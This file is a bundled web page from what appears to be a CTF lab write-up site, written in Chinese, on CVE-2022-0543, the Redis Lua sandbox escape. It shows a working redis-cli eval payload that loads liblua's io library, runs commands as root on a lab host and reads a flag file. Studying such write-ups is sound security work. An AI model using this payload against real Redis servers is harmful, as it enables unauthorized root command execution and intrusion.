"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[2988],{44809:(e,r,o)=>{o.r(r),o.d(r,{assets:()=>s,contentTitle:()=>i,default:()=>d,frontMatter:()=>l,metadata:()=>n,toc:()=>x});const n=JSON.parse('{"id":"Independent-Environment/CVE/CVE-2022-0543","title":"CVE-2022-0543","description":"Redis \u662f\u8457\u540d\u7684\u5f00\u6e90 Key-Value \u6570\u636e\u5e93\uff0c\u5176\u5177\u5907\u5728\u6c99\u7bb1\u4e2d\u6267\u884c Lua \u811a\u672c\u7684\u80fd\u529b\u3002 Debian \u4ee5\u53ca Ubuntu \u53d1\u884c\u7248\u7684\u6e90\u5728\u6253\u5305 Redis \u65f6\uff0c\u4e0d\u614e\u5728 Lua \u6c99\u7bb1\u4e2d\u9057\u7559\u4e86\u4e00\u4e2a\u5bf9\u8c61 package\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u5bf9\u8c61\u63d0\u4f9b\u7684\u65b9\u6cd5\u52a0\u8f7d\u52a8\u6001\u94fe\u63a5\u5e93 liblua \u91cc\u7684\u51fd\u6570\uff0c\u8fdb\u800c\u9003\u9038\u6c99\u7bb1\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002","source":"@site/docs/Independent-Environment/CVE/CVE-2022-0543.md","sourceDirName":"Independent-Environment/CVE","slug":"/Independent-Environment/CVE/CVE-2022-0543","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CVE/CVE-2022-0543","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Independent-Environment/CVE/CVE-2022-0543.md","tags":[],"version":"current","frontMatter":{},"sidebar":"Independent_Environment_Sidebar","previous":{"title":"CVE-2021-46203","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CVE/CVE-2021-46203"},"next":{"title":"CVE-2022-0779","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CVE/CVE-2022-0779"}}');var a=o(74848),t=o(28453);const l={},i="CVE-2022-0543",s={},x=[];function c(e){const r={admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",header:"header",p:"p",pre:"pre",...(0,t.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(r.header,{children:(0,a.jsx)(r.h1,{id:"cve-2022-0543",children:"CVE-2022-0543"})}),"\n",(0,a.jsx)(r.admonition,{type:"info",children:(0,a.jsxs)(r.blockquote,{children:["\n",(0,a.jsx)(r.p,{children:"Redis \u662f\u8457\u540d\u7684\u5f00\u6e90 Key-Value \u6570\u636e\u5e93\uff0c\u5176\u5177\u5907\u5728\u6c99\u7bb1\u4e2d\u6267\u884c Lua \u811a\u672c\u7684\u80fd\u529b\u3002 Debian \u4ee5\u53ca Ubuntu \u53d1\u884c\u7248\u7684\u6e90\u5728\u6253\u5305 Redis \u65f6\uff0c\u4e0d\u614e\u5728 Lua \u6c99\u7bb1\u4e2d\u9057\u7559\u4e86\u4e00\u4e2a\u5bf9\u8c61 package\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u5bf9\u8c61\u63d0\u4f9b\u7684\u65b9\u6cd5\u52a0\u8f7d\u52a8\u6001\u94fe\u63a5\u5e93 liblua \u91cc\u7684\u51fd\u6570\uff0c\u8fdb\u800c\u9003\u9038\u6c99\u7bb1\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002"}),"\n"]})}),"\n",(0,a.jsx)(r.p,{children:"\u76f4\u63a5\u6839\u636e\u6f0f\u6d1e\u4fe1\u606f\uff0c\u4ea4\u4e92\u5373\u53ef"}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{className:"language-bash",children:'\u250c\u2500\u2500(randark\u327fkali)-[~]\n\u2514\u2500$ redis-cli -h e51d46e4-a28b-4ee5-9fb6-6c7e767955b0-488.cyberstrikelab.com -p 37330\ne51d46e4-a28b-4ee5-9fb6-6c7e767955b0-488.cyberstrikelab.com:37330> KEYS *;\n(empty array)\ne51d46e4-a28b-4ee5-9fb6-6c7e767955b0-488.cyberstrikelab.com:37330> eval \'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res\' 0\n"uid=0(root) gid=0(root) groups=0(root)\\n"\n(10.12s)\ne51d46e4-a28b-4ee5-9fb6-6c7e767955b0-488.cyberstrikelab.com:37330> eval \'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("pwd", "r"); local res = f:read("*a"); f:close(); return res\' 0\n"/var/lib/redis\\n"\ne51d46e4-a28b-4ee5-9fb6-6c7e767955b0-488.cyberstrikelab.com:37330> eval \'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("ls -lh /", "r"); local res = f:read("*a"); f:close(); return res\' 0\n"total 4.0K\\nlrwxrwxrwx    1 root root   7 Mar  2  2022 bin -> usr/bin\\ndrwxr-xr-x    2 root root  10 Apr 15  2020 boot\\ndrwxr-xr-x    5 root root 360 Apr 23 14:41 dev\\ndrwxr-xr-x    1 root root  86 Apr 23 14:41 etc\\n-rwxr-xr-x    1 root root 152 Dec 11 05:58 flag.sh\\ndrwxr-xr-x    2 root root  10 Apr 15  2020 home\\nlrwxrwxrwx    1 root root   7 Mar  2  2022 lib -> usr/lib\\nlrwxrwxrwx    1 root root   9 Mar  2  2022 lib32 -> usr/lib32\\nlrwxrwxrwx    1 root root   9 Mar  2  2022 lib64 -> usr/lib64\\nlrwxrwxrwx    1 root root  10 Mar  2  2022 libx32 -> usr/libx32\\ndrwxr-xr-x    2 root root  10 Mar  2  2022 media\\ndrwxr-xr-x    2 root root  10 Mar  2  2022 mnt\\ndrwxr-xr-x    2 root root  10 Mar  2  2022 opt\\ndr-xr-xr-x 4344 root root   0 Apr 23 14:41 proc\\ndrwx------    2 root root  49 Mar  2  2022 root\\ndrwxr-xr-x    1 root root  29 Apr 23 14:41 run\\nlrwxrwxrwx    1 root root   8 Mar  2  2022 sbin -> usr/sbin\\ndrwxr-xr-x    2 root root  10 Mar  2  2022 srv\\ndr-xr-xr-x   13 root root   0 Apr 23 14:41 sys\\ndrwxrwxrwt    1 root root  30 Apr 23 14:41 tmp\\ndrwxr-xr-x    1 root root  57 Mar  2  2022 usr\\ndrwxr-xr-x    1 root root  40 Mar  2  2022 var\\n"\n(2.38s)\ne51d46e4-a28b-4ee5-9fb6-6c7e767955b0-488.cyberstrikelab.com:37330> eval \'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("/flag.sh", "r"); local res = f:read("*a"); f:close(); return res\' 0\n"18:C 23 Apr 2025 14:45:23.601 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo\\n18:C 23 Apr 2025 14:45:23.601 # Redis version=5.0.7, bits=64, commit=00000000, modified=0, pid=18, just started\\n18:C 23 Apr 2025 14:45:23.601 # Configuration loaded\\n18:M 23 Apr 2025 14:45:23.601 # Could not create server TCP listening socket 0.0.0.0:6379: bind: Address already in use\\n"\ne51d46e4-a28b-4ee5-9fb6-6c7e767955b0-488.cyberstrikelab.com:37330> eval \'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /flag.sh", "r"); local res = f:read("*a"); f:close(); return res\' 0\n"#!/bin/bash\\n# \\xe8\\xbe\\x93\\xe5\\x87\\xba\\xe7\\x8e\\xaf\\xe5\\xa2\\x83\\xe5\\x8f\\x98\\xe9\\x87\\x8f $flag \\xe7\\x9a\\x84\\xe5\\x86\\x85\\xe5\\xae\\xb9\\xe5\\x88\\xb0 /tmp/flag.txt\\necho $flag > /tmp/flag.txt\\n# \\xe6\\x89\\xa7\\xe8\\xa1\\x8c\\xe7\\x9a\\x84\\xe5\\x90\\xaf\\xe5\\x8a\\xa8\\xe8\\x84\\x9a\\xe6\\x9c\\xac\\nredis-server /etc/redis/redis.conf\\n"\n(1.62s)\ne51d46e4-a28b-4ee5-9fb6-6c7e767955b0-488.cyberstrikelab.com:37330> eval \'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /tmp/flag.txt", "r"); local res = f:read("*a"); f:close(); return res\' 0\n"go-flag{c0c62457-e009-451b-9ec9-557b674bec1e}\\n"\n'})})]})}function d(e={}){const{wrapper:r}={...(0,t.R)(),...e.components};return r?(0,a.jsx)(r,{...e,children:(0,a.jsx)(c,{...e})}):c(e)}},28453:(e,r,o)=>{o.d(r,{R:()=>l,x:()=>i});var n=o(96540);const a={},t=n.createContext(a);function l(e){const r=n.useContext(t);return n.useMemo((function(){return"function"==typeof e?e(r):{...r,...e}}),[r,e])}function i(e){let r;return r=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:l(e.components),n.createElement(t.Provider,{value:r},e.children)}}}]);